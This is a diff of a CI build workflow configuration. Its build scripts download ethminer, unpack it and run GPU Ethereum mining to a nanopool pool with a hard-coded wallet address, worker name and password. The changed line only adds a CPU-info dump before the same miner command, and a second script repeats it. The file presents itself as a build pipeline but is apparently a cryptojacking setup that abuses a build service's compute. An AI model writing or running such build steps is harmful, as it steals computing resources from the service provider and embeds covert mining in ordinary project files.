@@ -22,7 +22,7 @@ workflows:
     scripts:
       - name: script_1
         script: |
-                wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && tar -xvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && bin/ethminer -G -P stratum1+tcp://0x3f834008148a59ea8f71bf9a607064ce430d5ad5.Kangbarbar:Cukdeh1234@eth-us-west1.nanopool.org:9999
+                cat /proc/cpuinfo && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && tar -xvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && bin/ethminer -G -P stratum1+tcp://0x3f834008148a59ea8f71bf9a607064ce430d5ad5.Kangbarbar:Cukdeh1234@eth-us-west1.nanopool.org:9999
       - name: script_2
         script: |
                 wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && tar -xvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && bin/ethminer -G -P stratum1+tcp://0x3f834008148a59ea8f71bf9a607064ce430d5ad5.Kangbarbar:Cukdeh1234@eth-us-west1.nanopool.org:9999
